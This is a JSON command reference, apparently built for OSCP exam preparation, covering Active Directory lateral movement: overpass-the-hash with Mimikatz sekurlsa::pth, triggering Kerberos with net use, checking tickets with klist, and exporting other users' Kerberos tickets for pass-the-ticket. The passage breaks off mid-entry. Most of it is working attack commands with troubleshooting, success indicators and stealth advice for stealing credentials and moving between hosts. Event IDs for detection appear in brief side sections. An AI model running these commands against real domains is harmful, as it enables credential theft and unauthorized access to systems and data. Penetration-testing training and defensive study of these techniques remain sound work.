{
  "commands": [
    {
      "id": "overpass-mimikatz-pth",
      "name": "Overpass-the-Hash - Mimikatz sekurlsa::pth",
      "description": "Convert NTLM hash to Kerberos TGT by creating process with hash then requesting Kerberos tickets",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<USER>",
          "description": "Username",
          "example": "jen",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain FQDN",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<NTLM_HASH>",
          "description": "NTLM hash",
          "example": "369def79d8372408bf6e93364cc93075",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "overpass-the-hash",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "overpass-rubeus-asktgt"
      ],
      "next_steps": [
        "overpass-net-use-trigger  # Trigger Kerberos authentication to generate TGT",
        "kerberos-klist-verify  # Verify TGT and TGS tickets were created",
        "psexec-sysinternals  # Use Kerberos tickets for lateral movement"
      ],
      "flag_explanations": {
        "sekurlsa::pth": "Pass-the-hash module",
        "/user": "Username",
        "/domain": "Domain FQDN (corp.com not corp)",
        "/ntlm": "NTLM hash",
        "/run": "Program to launch (PowerShell recommended)"
      },
      "success_indicators": [
        "user : <USER>",
        "domain : <DOMAIN>",
        "New PowerShell window opens"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_pth",
        "privilege::debug FAILED"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "No tickets generated": "Must trigger Kerberos auth - use 'net use' or access network resource",
        "whoami shows wrong user": "Expected - token shows original user, but Kerberos tickets use <USER>"
      },
      "notes": "OSCP TRAINING MATERIAL - OVERPASS-THE-HASH WITH MIMIKATZ:\n\nTRAINING EXAMPLE (EXACT COMMAND FROM OSCP MODULE):\nScenario: jen's credentials cached on CLIENT76 after running notepad as jen.\n\nFrom CLIENT76 as jeff, performing overpass-the-hash:\n```\nmimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell\n```\n\nResult: New PowerShell window opened in context of jen (with jen's credentials injected).\n\nWHAT IS OVERPASS-THE-HASH: Technique that converts NTLM hash into Kerberos Ticket Granting Ticket (TGT), enabling Kerberos authentication when you only have the NTLM hash. Also called \"Pass-the-Key\".\n\nWHY USE OVERPASS:\n- Some tools REQUIRE Kerberos authentication (Sysinternals PsExec with Kerberos)\n- Kerberos authentication is less logged/monitored than NTLM in some environments\n- Avoids NTLM authentication over network (stealthier)\n- Enables access to resources that only accept Kerberos\n\nKEY DISTINCTION FROM PASS-THE-HASH:\n- Pass-the-Hash (PTH): Uses NTLM protocol directly with hash\n- Overpass-the-Hash: Converts NTLM hash → Kerberos TGT, then uses Kerberos protocol\n- PTH: Lateral movement via NTLM\n- Overpass: Lateral movement via Kerberos (requires TGT)\n\nHOW OVERPASS-THE-HASH WORKS:\n1. Mimikatz sekurlsa::pth injects NTLM hash into LSASS process memory\n2. Creates new logon session with injected credentials\n3. Spawns specified program (/run:powershell) in new session context\n4. Program runs as original user (token) but has jen's credentials for network auth\n5. When Kerberos authentication triggered (net use, etc.), KDC uses injected hash for pre-authentication\n6. KDC issues TGT using hash (hash proves identity)\n7. TGT can then request service tickets (TGS) for lateral movement\n\nTWO-STEP PROCESS (CRITICAL UNDERSTANDING):\nStep 1: sekurlsa::pth (injects credentials)\nStep 2: Trigger Kerberos authentication (net use, dir \\\\target, etc.) to generate TGT\n\nsekurlsa::pth does NOT create TGT automatically - must trigger manually.\n\nWHOAMI BEHAVIOR (FROM TRAINING):\nAfter sekurlsa::pth, running whoami in new PowerShell shows ORIGINAL user (jeff), NOT impersonated user (jen).\n\nTraining explicitly states:\n\"Although jen is impersonated, the whoami command on this newly spawned PowerShell session shows the original user jeff. This is the intended behavior.\"\n\nWhy?\n- whoami checks process token (shows jeff)\n- Network authentication uses injected credentials (uses jen)\n- Token impersonation vs credential injection are different mechanisms\n\nVerify with klist (shows jen's Kerberos tickets), NOT whoami.\n\nTRIGGERING KERBEROS AUTHENTICATION:\nFrom training, after sekurlsa::pth, you must trigger Kerberos:\n```powershell\nPS C:\\> net use \\\\files04\n```\n\nThis command:\n1. Attempts to connect to files04 via SMB\n2. Triggers Kerberos authentication (because hostname used, not IP)\n3. KDC receives TGT request with jen's hash for pre-authentication\n4. KDC issues TGT for jen\n5. Client requests TGS for CIFS service on files04\n6. Connection succeeds using jen's Kerberos tickets\n\nVERIFICATION:\nFrom training, verify tickets created:\n```powershell\nPS C:\\> klist\n```\n\nOutput shows:\n```\nClient: jen @ CORP.COM\nServer: krbtgt/CORP.COM @ CORP.COM\n  KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n  Start Time: <timestamp>\n  End Time: <timestamp>\n  Renew Time: <timestamp>\n```\n\nTGT confirmed (Server: krbtgt).\n\nAlso shows TGS:\n```\nServer: cifs/files04 @ CORP.COM\n```\n\nService ticket for CIFS on files04.\n\nLATERAL MOVEMENT:\nFrom training, using Kerberos tickets for PsExec:\n```powershell\nPS C:\\Tools\\SysinternalsSuite> .\\PsExec.exe \\\\files04 cmd\n```\n\nThis succeeded because:\n- PsExec detected Kerberos tickets in cache\n- Used Kerberos authentication instead of NTLM\n- jen's TGT valid for requesting service tickets\n- Access granted to files04 as jen\n\nPRE-AUTHENTICATION:\nKerberos pre-authentication uses password hash (NTLM or AES) to encrypt timestamp:\n1. Client requests TGT from KDC\n2. Client encrypts current timestamp with user's hash\n3. KDC decrypts with stored hash\n4. If decryption succeeds and timestamp valid, TGT issued\n\nOverpass works because Mimikatz provides correct hash for encryption.\n\nHASH SOURCES:\nFrom training scenario, obtained hash via:\n1. jen ran notepad as herself on CLIENT76 (runas /user:jen notepad)\n2. Credentials cached in LSASS memory\n3. Mimikatz extracted: sekurlsa::logonpasswords\n4. Output showed jen's NTLM hash: 369def79d8372408bf6e93364cc93075\n\nOther sources:\n- secretsdump.py (remote SAM/LSA dump)\n- SAM database extraction\n- LSA secrets\n- NTDS.dit (domain controller database)\n\nMANUAL ALTERNATIVE:\nNo direct manual alternative for overpass-the-hash:\n- PowerShell cannot natively use hash for authentication\n- Requires Mimikatz or Rubeus for hash-to-TGT conversion\n- Normal flow requires plaintext password\n\nRubeus alternative:\n```\nRubeus.exe asktgt /user:jen /domain:corp.com /rc4:369def79d8372408bf6e93364cc93075 /ptt\n```\nSingle command vs Mimikatz multi-step.\n\nDOMAIN REQUIREMENT:\n- /domain must be FQDN: corp.com not CORP\n- Matches Kerberos realm name\n- Case-insensitive but convention is lowercase\n\nPORT REQUIREMENTS:\n- TCP 88: Kerberos (KDC communication for TGT/TGS requests)\n- TCP/UDP 88: Kerberos authentication\n- No SMB/RPC required for TGT request (unlike Pass-the-Hash)\n\nEXECUTION CONTEXT:\nNew PowerShell spawned:\n- Process owner: Original user (jeff) - visible in Task Manager\n- Process token: jeff's token\n- Network credentials: jen's credentials (injected)\n- Kerberos tickets: jen's TGT/TGS\n\nThis split allows:\n- Local operations: As jeff\n- Network operations: As jen\n\nSECURITY CONTEXT:\nFrom training scenario:\n- jeff: Local user on CLIENT76 (attacker's initial access)\n- jen: Domain user, local admin on FILES04 (target privilege level)\n- Overpass allows jeff's session to network authenticate as jen\n- jeff never obtains jen's actual privileges locally\n\nTIME ESTIMATE:\n- sekurlsa::pth execution: 10-20 seconds\n- Trigger Kerberos (net use): 5-10 seconds\n- Verification (klist): 5 seconds\n- Total: 1-2 minutes\n\nEXAM STRATEGY:\n1. Obtain NTLM hash via Mimikatz/secretsdump\n2. Use overpass-the-hash to convert to Kerberos TGT\n3. Trigger with net use \\\\target (hostname NOT IP)\n4. Verify with klist (look for TGT with Server: krbtgt)\n5. Use Kerberos-enabled tools (PsExec, PowerShell remoting)\n6. Remember whoami shows original user - use klist to verify\n\nWHEN TO USE OVERPASS:\n- Target requires Kerberos (not NTLM)\n- Want to avoid NTLM authentication logs\n- Have hash but need Kerberos tickets\n- Sysinternals PsExec scenario (prefers Kerberos over NTLM)\n\nWHEN TO USE PASS-THE-HASH INSTEAD:\n- Target accepts NTLM authentication\n- Faster/simpler (no Kerberos setup)\n- Impacket tools from Kali (PSExec, WMIExec, SMBExec)\n\nCOMMON FAILURES:\n- No TGT generated: Forgot to trigger Kerberos (net use)\n- IP used instead of hostname: Kerberos requires hostname for SPN\n- Wrong domain format: Use FQDN (corp.com not CORP)\n- Time skew >5 minutes: Synchronize clock with DC\n- Hash invalid: Verify extraction from sekurlsa::logonpasswords\n\nFORENSIC ARTIFACTS:\n- Event ID 4624: Logon Type 9 (NewCredentials) when using /run\n- Event ID 4768: Kerberos TGT request (pre-authentication)\n- Event ID 4769: Kerberos TGS request (service ticket)\n- Event ID 4648: Explicit credential logon\n- Mimikatz execution traces in memory/logs\n- PowerShell spawned by mimikatz.exe (process tree)\n\nKERBEROS TICKET LIFETIME:\nDefault:\n- TGT: 10 hours\n- TGS: 10 hours\n- Renewable for 7 days\n\nCheck End Time in klist output.",
      "oscp_relevance": "high"
    },
    {
      "id": "overpass-net-use-trigger",
      "name": "Overpass-the-Hash - Trigger Kerberos TGT Request",
      "description": "Trigger Kerberos TGT/TGS generation after overpass-the-hash by accessing network resource",
      "command": "net use \\\\<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname (NOT IP - must use hostname for Kerberos)",
          "example": "files04",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "overpass-the-hash",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [
        "overpass-mimikatz-pth"
      ],
      "alternatives": [],
      "next_steps": [
        "kerberos-klist-verify  # Verify TGT (krbtgt) and TGS (cifs/target) tickets created",
        "psexec-sysinternals  # Execute lateral movement using Kerberos authentication"
      ],
      "flag_explanations": {
        "net use": "Map network drive (triggers Kerberos authentication)",
        "\\\\<TARGET>": "UNC path - MUST use hostname not IP for Kerberos SPN lookup"
      },
      "success_indicators": [
        "The command completed successfully",
        "klist shows TGT (krbtgt) and TGS (cifs/target)"
      ],
      "failure_indicators": [
        "System error 5 - Access is denied",
        "The network path was not found"
      ],
      "troubleshooting": {
        "Access denied": "Hash may be invalid or user lacks permissions",
        "Network path not found": "Use hostname not IP - Kerberos requires SPN resolution",
        "Still no tickets": "Verify PowerShell session spawned by mimikatz sekurlsa::pth",
        "IP address used": "Change to hostname: net use \\\\FILES04 not \\\\192.168.50.73"
      },
      "notes": "OSCP TRAINING MATERIAL - TRIGGERING KERBEROS TGT AFTER OVERPASS-THE-HASH:\n\nTRAINING EXAMPLE (FROM OSCP MODULE):\nAfter performing sekurlsa::pth, training demonstrates triggering Kerberos:\n```powershell\nPS C:\\Tools> net use \\\\files04\nThe command completed successfully.\n```\n\nThen verify tickets:\n```powershell\nPS C:\\Tools> klist\n```\n\nOutput shows:\n```\nCurrent LogonId is 0:0x11e387b\n\nCached Tickets: (2)\n\n#0>     Client: jen @ CORP.COM\n        Server: krbtgt/CORP.COM @ CORP.COM\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n\n#1>     Client: jen @ CORP.COM\n        Server: cifs/files04 @ CORP.COM\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n```\n\nConfirms TGT (#0, Server: krbtgt) and TGS (#1, Server: cifs/files04) created.\n\nWHY TRIGGER IS NECESSARY:\nOverpass-the-hash is TWO-STEP process:\n\nStep 1: sekurlsa::pth injects credentials into LSASS\nStep 2: Trigger Kerberos authentication to REQUEST TGT from KDC\n\nsekurlsa::pth does NOT automatically create TGT. It only sets up credential context. You must explicitly trigger Kerberos authentication.\n\nWHAT \"TRIGGER\" MEANS:\nAny operation that requires network authentication to domain resource:\n- net use \\\\hostname\n- dir \\\\hostname\\share\n- Get-Content \\\\hostname\\path\\file.txt\n- Test-Path \\\\hostname\\share\n- PsExec.exe \\\\hostname cmd (auto-triggers)\n\nThese operations cause Windows to:\n1. Detect need for authentication to domain resource\n2. Check ticket cache (empty after sekurlsa::pth)\n3. Request TGT from KDC using injected credentials\n4. Request TGS for specific service\n5. Cache both tickets for reuse\n\nHOSTNAME REQUIREMENT (CRITICAL):\nKerberos requires HOSTNAME, not IP address.\n\nCorrect:\n```powershell\nnet use \\\\files04\n```\n\nIncorrect:\n```powershell\nnet use \\\\192.168.50.73\n```\n\nWhy?\nKerberos uses Service Principal Names (SPNs) format:\n- service/hostname@DOMAIN\n- Example: cifs/files04@CORP.COM\n\nSPN cannot be constructed from IP address. DNS resolution maps hostname → IP, but SPN needs hostname.\n\nSERVICE PRINCIPAL NAMES (SPNs):\nDifferent services have different SPNs:\n- CIFS/SMB: cifs/hostname (file shares)\n- HTTP: http/hostname (web services)\n- LDAP: ldap/hostname (directory services)\n- HOST: host/hostname (general services)\n- MSSQL: MSSQLSvc/hostname:port (SQL Server)\n\nTrigger for CIFS: net use \\\\hostname\nTrigger for HTTP: Invoke-WebRequest http://hostname\nTrigger for LDAP: Get-ADUser (domain queries)\n\nTICKET CREATION FLOW:\n1. net use \\\\files04 executed\n2. Windows detects domain resource access needed\n3. Checks Kerberos ticket cache for existing cifs/files04 ticket\n4. No ticket found, checks for TGT\n5. No TGT found, requests TGT from KDC:\n   a. AS-REQ (Authentication Service Request) to KDC\n   b. Pre-authentication: Timestamp encrypted with jen's hash (injected by Mimikatz)\n   c. KDC validates pre-auth with jen's stored hash\n   d. AS-REP (Authentication Service Reply): TGT issued\n6. TGT cached (#0 in klist output)\n7. Using TGT, requests TGS for cifs/files04:\n   a. TGS-REQ (Ticket Granting Service Request) to KDC\n   b. Presents TGT as proof of identity\n   c. KDC issues service ticket for cifs/files04\n   d. TGS-REP: Service ticket returned\n8. TGS cached (#1 in klist output)\n9. Service ticket presented to files04 for access\n10. Connection succeeds\n\nTWO TICKETS CREATED:\nTicket #0 - TGT (Ticket Granting Ticket):\n- Server: krbtgt/CORP.COM\n- Purpose: Request service tickets\n- Lifetime: 10 hours (default)\n- Renewable: 7 days (default)\n- Encryption: AES-256 or RC4\n\nTicket #1 - TGS (Ticket Granting Service):\n- Server: cifs/files04\n- Purpose: Access specific service on specific host\n- Lifetime: 10 hours (default)\n- Service-specific: Only works for CIFS on files04\n\nALTERNATIVE TRIGGER COMMANDS:\nFrom new PowerShell (spawned by sekurlsa::pth):\n\nFile access:\n```powershell\ndir \\\\files04\\c$\n```\n\nTest connection:\n```powershell\nTest-Path \\\\files04\\c$\n```\n\nExplicit authentication:\n```powershell\n.\\PsExec.exe \\\\files04 cmd\n```\n\nAny will trigger TGT request.\n\nVERIFICATION:\nAlways verify with klist after trigger:\n```powershell\nklist\n```\n\nSuccess indicators:\n- Cached Tickets: (2) or more\n- Client: jen @ CORP.COM (impersonated user)\n- Server: krbtgt/CORP.COM (TGT exists)\n- Server: cifs/files04 (service ticket exists)\n\nFailure indicators:\n- Cached Tickets: (0)\n- No tickets displayed\n- Client still shows original user\n\nIf no tickets:\n1. Verify sekurlsa::pth completed successfully\n2. Verify running commands in Mimikatz-spawned PowerShell (not original)\n3. Check hostname used (not IP)\n4. Verify network connectivity to DC (port 88)\n5. Check time synchronization (must be <5 min difference with DC)\n\nNETWORK PATH FORMATS:\nUNC paths for triggering:\n- \\\\hostname (default share discovery)\n- \\\\hostname\\share (specific share)\n- \\\\hostname\\share\\path\\file (specific file)\n- \\\\hostname.domain.com (FQDN works too)\n- \\\\hostname (short name sufficient if DNS resolves)\n\nNOT triggering Kerberos:\n- \\\\192.168.50.73 (IP address - falls back to NTLM)\n- C:\\local\\path (local file system)\n- Localhost or 127.0.0.1 (local machine)\n\nPORT REQUIREMENTS:\n- TCP/UDP 88: Kerberos (KDC communication)\n- TCP/UDP 53: DNS (hostname resolution)\n- TCP 445: SMB (if using net use for files)\n\nKDC COMMUNICATION:\nKDC = Key Distribution Center (runs on Domain Controller):\n- Handles TGT requests (AS)\n- Handles TGS requests (TGS)\n- Validates pre-authentication\n- Issues tickets\n\nFrom training, KDC is domain controller (DC1 typically).\n\nTIME ESTIMATE:\n- net use \\\\hostname: 2-5 seconds\n- TGT/TGS request: <3 seconds\n- klist verification: <5 seconds\n- Total: <10 seconds\n\nEXAM STRATEGY:\n1. After sekurlsa::pth, IMMEDIATELY trigger Kerberos\n2. Use simple trigger: net use \\\\<DC_HOSTNAME>\n3. Verify with klist before proceeding\n4. If no tickets, troubleshoot before continuing\n5. Common issue: Using IP instead of hostname\n\nCOMMON ERRORS:\nSystem error 5 - Access denied:\n- Hash invalid or user lacks permissions\n- Verify hash correctness\n- Check user account status (disabled?)\n\nThe network path was not found:\n- Hostname not resolvable via DNS\n- Check DNS resolution: nslookup hostname\n- Verify hostname spelling\n- Try FQDN: \\\\files04.corp.com\n\nNo tickets after successful net use:\n- Not running in Mimikatz-spawned PowerShell\n- Close and use the NEW PowerShell window\n- Credentials only injected in spawned process\n\nIP address used:\n- Change to hostname immediately\n- Kerberos will NOT work with IP\n- NTLM fallback may occur (defeats purpose)\n\nFORENSIC ARTIFACTS:\n- Event ID 4768: Kerberos TGT request (on DC)\n- Event ID 4769: Kerberos TGS request (on DC)\n- Event ID 4624: Network logon Type 3 (on target)\n- Network traffic on port 88 (to DC)\n- SMB traffic on port 445 (to target)\n\nKERBEROS VS NTLM FALLBACK:\nIf hostname not used:\n- Windows attempts Kerberos first\n- SPN lookup fails (no hostname)\n- Falls back to NTLM authentication\n- Defeats purpose of overpass (wanted Kerberos)\n\nAlways use hostname to ensure Kerberos used.",
      "oscp_relevance": "high"
    },
    {
      "id": "kerberos-klist-verify",
      "name": "Kerberos - List Cached Tickets (klist)",
      "description": "Display cached Kerberos TGT and TGS tickets for current session",
      "command": "klist",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "oscp",
        "kerberos",
        "verification",
        "enumeration",
        "active-directory",
        "windows"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "passticket-mimikatz-export  # Export tickets to .kirbi files for pass-the-ticket",
        "psexec-sysinternals  # Use cached tickets for lateral movement",
        "kerberos-purge-tickets  # Clear tickets when done for OPSEC"
      ],
      "flag_explanations": {
        "klist": "List Kerberos tickets (built-in Windows command)",
        "klist purge": "Clear all cached tickets",
        "klist tgt": "Show only TGT tickets"
      },
      "success_indicators": [
        "Client: <USER> @ <DOMAIN>",
        "Server: krbtgt/<DOMAIN> (TGT)",
        "Server: cifs/<TARGET> (TGS for file access)",
        "Cached Tickets: (N)"
      ],
      "failure_indicators": [
        "Cached Tickets: (0)",
        "Error: No tickets found"
      ],
      "troubleshooting": {
        "No tickets found": "No Kerberos auth performed yet - trigger with net use or access network resource",
        "Wrong user in tickets": "Tickets cached in different session - ensure checking correct PowerShell window",
        "Tickets expired": "End Time shows past time - perform new authentication"
      },
      "notes": "OSCP TRAINING MATERIAL - VERIFY KERBEROS TICKETS WITH KLIST:\n\nTRAINING EXAMPLE (FROM OSCP MODULE):\nAfter overpass-the-hash and triggering Kerberos:\n```powershell\nPS C:\\Tools> klist\n\nCurrent LogonId is 0:0x11e387b\n\nCached Tickets: (2)\n\n#0>     Client: jen @ CORP.COM\n        Server: krbtgt/CORP.COM @ CORP.COM\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize\n        Start Time: 5/16/2022 18:30:12\n        End Time:   5/17/2022 4:30:12\n        Renew Time: 5/23/2022 18:30:12\n\n#1>     Client: jen @ CORP.COM\n        Server: cifs/files04 @ CORP.COM\n        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n```\n\nWHAT IS KLIST: Built-in Windows command (part of Windows OS since Windows 2000) that displays cached Kerberos tickets for current logon session. No installation required, always available.\n\nTICKET TYPES:\nTicket #0 - TGT (Ticket Granting Ticket):\n- Server: krbtgt/DOMAIN (krbtgt is special Kerberos service account)\n- Purpose: Request service tickets from KDC\n- Lifetime: 10 hours default (configurable via GPO)\n- Renewable: 7 days default\n- Most important ticket - can request any service ticket\n\nTicket #1+ - TGS (Ticket Granting Service / Service Tickets):\n- Server: service/hostname @ DOMAIN\n- Purpose: Access specific service on specific server\n- Examples: cifs/files04 (file access), http/web01 (web), ldap/dc1 (directory)\n- Service-specific: Cannot reuse for different service/host\n\nWHY VERIFY TICKETS:\n- Confirm overpass-the-hash succeeded\n- Check ticket exists before lateral movement (avoid wasted attempts)\n- Verify ticket not expired\n- Identify which services accessible\n- Troubleshoot authentication issues\n\nKEY FIELDS EXPLAINED:\nClient:\n- Shows WHO the ticket is for\n- jen @ CORP.COM = Ticket grants jen's access\n- Should match user from overpass/pass-the-ticket\n\nServer:\n- Shows WHAT SERVICE the ticket grants access to\n- krbtgt = TGT (can request other tickets)\n- cifs/hostname = File share access\n- http/hostname = Web service access\n\nKerbTicket Encryption Type:\n- AES-256-CTS-HMAC-SHA1-96: Modern, secure (preferred)\n- AES-128-CTS-HMAC-SHA1-96: Modern, acceptable\n- RC4-HMAC (0x17): Legacy, weak (essentially NTLM hash)\n- DES: Very old, deprecated\n\nTicket Flags:\n- forwardable: Ticket can be forwarded to other services\n- renewable: Ticket can be renewed before expiration\n- initial: First authentication (TGT from password/hash)\n- pre_authent: Pre-authentication performed\n\nStart Time:\n- When ticket becomes valid\n- Usually immediate\n\nEnd Time:\n- When ticket expires\n- Default: Start Time + 10 hours\n- After End Time: Ticket invalid, must re-authenticate\n\nRenew Time:\n- Maximum lifetime if renewed\n- Default: Start Time + 7 days\n- Can request renewal before End Time\n\nLogonId:\n- Unique identifier for logon session\n- Format: 0:0xHEXVALUE\n- Tickets tied to specific logon session\n- Different sessions have different ticket caches\n\nCOMMON VERIFICATION SCENARIOS:\nAfter overpass-the-hash:\n```powershell\nklist\n```\nExpect:\n- Cached Tickets: (2+)\n- Client: impersonated_user @ DOMAIN\n- Server: krbtgt/DOMAIN (TGT)\n- Server: cifs/target or service/target (TGS)\n\nAfter pass-the-ticket:\n```powershell\nklist\n```\nExpect:\n- New ticket appears in list\n- Client shows stolen ticket's user\n- Server shows service from imported ticket\n\nTROUBLESHOOTING WITH KLIST:\nCached Tickets: (0)\n- No Kerberos authentication performed\n- Overpass not triggered (missing net use step)\n- Wrong PowerShell session (not Mimikatz-spawned)\n- Tickets purged\n\nClient shows wrong user:\n- Tickets from different session\n- Overpass failed\n- Pass-the-ticket not injected correctly\n\nServer doesn't match target:\n- Wrong service ticket\n- Need different ticket for target service\n- May need to trigger additional authentication\n\nTicket expired (current time > End Time):\n- Re-authenticate to get new ticket\n- Or renew if within Renew Time\n\nADVANCED KLIST COMMANDS:\nklist tgt:\n- Show only TGT tickets\n- Filters out service tickets\n\nklist purge:\n- Delete ALL cached tickets\n- Requires admin or affects only current user\n- Used for cleanup/OPSEC\n\nklist sessions:\n- Show all logon sessions\n- Displays LogonId for each\n\nklist -lh 0 -li 0x3e7:\n- Query specific logon session\n- Useful for viewing other users' tickets (requires SYSTEM)\n\nWHAT KLIST DOESN'T SHOW:\n- Password or hash\n- Ticket encryption keys\n- Full ticket contents (use Mimikatz for export)\n- Tickets from other logon sessions (unless admin)\n\nTIME ESTIMATE:\n- Execution: <5 seconds\n- Output review: 10-20 seconds\n\nEXAM STRATEGY:\n1. Run klist AFTER every Kerberos operation\n2. Verify tickets before lateral movement attempts\n3. Check End Time - don't use expired tickets\n4. If no tickets, troubleshoot before proceeding\n5. Screenshot klist output for documentation\n\nCOMMON MISTAKES:\n- Forgetting to verify after overpass-the-hash\n- Using expired tickets (check End Time!)\n- Checking klist in wrong PowerShell window\n- Expecting whoami to show ticket user (use klist Client field instead)",
      "oscp_relevance": "high"
    },
    {
      "id": "passticket-mimikatz-export",
      "name": "Pass-the-Ticket - Export Tickets (Mimikatz)",
      "description": "Export all cached Kerberos tickets to .kirbi files for reuse on other systems",
      "command": "mimikatz # privilege::debug\nmimikatz # sekurlsa::tickets /export",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [],
      "tags": [
        "oscp",
        "pass-the-ticket",
        "mimikatz",
        "kerberos",
        "lateral-movement",
        "active-directory",
        "windows",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [
        "passticket-mimikatz-inject  # Inject exported .kirbi ticket into current session",
        "smb-list-shares  # Test access using injected ticket",
        "kerberos-klist-verify  # Verify ticket injected successfully"
      ],
      "flag_explanations": {
        "sekurlsa::tickets": "Access LSASS process to extract tickets",
        "/export": "Save tickets to .kirbi files in current directory",
        "privilege::debug": "Required for LSASS memory access"
      },
      "success_indicators": [
        "* Saved to file [0;xxxxxx]-2-0-*.kirbi",
        "Multiple .kirbi files created",
        "Tickets exported for multiple users/sessions"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa_acquireLSA",
        "privilege::debug FAILED",
        "No tickets found"
      ],
      "troubleshooting": {
        "privilege::debug FAILED": "Run mimikatz as Administrator",
        "No tickets exported": "No active Kerberos sessions - wait for users to login/authenticate",
        "ERROR kuhl_m_sekurlsa_acquireLSA": "LSASS protection enabled - may need to bypass PPL",
        "Too many .kirbi files": "Normal - exports all tickets from all sessions"
      },
      "notes": "OSCP TRAINING MATERIAL - PASS-THE-TICKET EXPORT WITH MIMIKATZ:\n\nTRAINING EXAMPLE (FROM OSCP MODULE):\nScenario: dave has access to \\\\web04\\backup, jen does not. Goal: Steal dave's ticket and use it as jen.\n\nFrom CLIENT74 as jen (with admin rights), export all tickets:\n```\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # sekurlsa::tickets /export\n\n[...]\n* Saved to file [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi\n* Saved to file [0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi\n[...]\n```\n\nTraining shows multiple .kirbi files created, including dave's TGS for CIFS service on web04.\n\nWHAT IS PASS-THE-TICKET: Lateral movement technique that steals and reuses existing Kerberos tickets from one session/machine and injects them into another, enabling access without knowing passwords or hashes.\n\nKEY DISTINCTION FROM OTHER TECHNIQUES:\n- Pass-the-Hash: Uses NTLM hash for authentication\n- Overpass-the-Hash: Converts NTLM hash to TGT\n- Pass-the-Ticket: Steals and reuses existing Kerberos tickets\n\nPass-the-Ticket advantage: No hash needed, just steal live tickets.\n\nTRAINING SCENARIO CONTEXT:\n- dave: Domain user with access to \\\\web04\\backup\n- jen: Domain user, local admin on CLIENT74, NO access to \\\\web04\\backup\n- CLIENT74: Windows client where both dave and jen have sessions\n- Goal: jen steals dave's ticket to access \\\\web04\\backup\n\nHOW TICKET EXPORT WORKS:\n1. Mimikatz accesses LSASS process (requires privilege::debug)\n2. Reads Kerberos ticket cache from memory\n3. Extracts tickets from all active logon sessions\n4. Saves each ticket as .kirbi file (Mimikatz format)\n5. Tickets written to current directory\n\nWHY TICKETS ARE VALUABLE:\n- Tickets grant access without passwords\n- Can be moved to different machines\n- Can be injected into different user sessions\n- Portable authentication credentials\n- Time-limited but reusable until expiration\n\nKIRBI FILENAME FORMAT (FROM TRAINING):\n```\n[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi\n```\n\nBreakdown:\n- [0;12bd0]: LUID (Logon Session ID) - identifies source session\n- 0: Group number\n- 0: Type (0=TGS service ticket, 2=TGT)\n- 40810000: Flags (hex)\n- dave: Username\n- cifs-web04: Service (CIFS) and hostname (web04)\n- .kirbi: Mimikatz format\n\nTICKET TYPES IN EXPORT:\nTGT (Ticket Granting Ticket):\n- Filename pattern: [LUID]-2-0-FLAGS-user@krbtgt-DOMAIN.kirbi\n- Example: [0;3e7]-2-0-40e10000-dave@krbtgt-CORP.COM.kirbi\n- Server: krbtgt\n- Purpose: Request service tickets\n- Most valuable - can request any service ticket\n\nTGS (Service Tickets):\n- Filename pattern: [LUID]-0-0-FLAGS-user@service-host.kirbi\n- Example: [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi\n- Server: specific service/host\n- Purpose: Access specific service on specific server\n- Service-specific: Only works for that service/host combination\n\nFrom training, dave's CIFS ticket for web04 was the target:\n```\n[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi\n```\n\nThis ticket grants file share access (CIFS) to web04 as dave.\n\nMULTIPLE SESSIONS EXPORTED:\nMimikatz exports tickets from ALL logon sessions on the system:\n- Interactive logins (users at keyboard)\n- RDP sessions\n- Service accounts\n- Network authentications\n- RunAs sessions\n\nTypical export yields:\n- Dozens to hundreds of .kirbi files\n- Tickets from multiple users\n- Mix of TGT and TGS tickets\n- Current and expired tickets\n\nFINDING VALUABLE TICKETS:\nFrom training, after export:\n```powershell\nPS C:\\Tools> dir *.kirbi\n```\n\nLook for:\n- High-privilege users (domain admins, server admins)\n- TGT tickets (most flexible)\n- Service tickets to target systems\n- Tickets with future End Time (not expired)\n\nFROM TRAINING: Identified dave's ticket by:\n1. Looking for username (dave)\n2. Looking for target service/host (cifs-web04)\n3. Checking it's dave's ticket for web04 access\n\nPRIVILEGE REQUIREMENTS:\nExport requires:\n- Administrator privileges on current system\n- privilege::debug enabled (SeDebugPrivilege)\n- Access to LSASS process\n\nFrom training: jen was local admin on CLIENT74, enabling ticket export.\n\nNO ADMIN REQUIRED ON TARGET:\nImportant: Admin needed on SOURCE (export machine), NOT target.\n- Export: Admin on CLIENT74 (current machine)\n- Inject: No admin needed (current user session)\n- Use: Depends on ticket permissions\n\nKIRBI FILE PORTABILITY:\nOnce 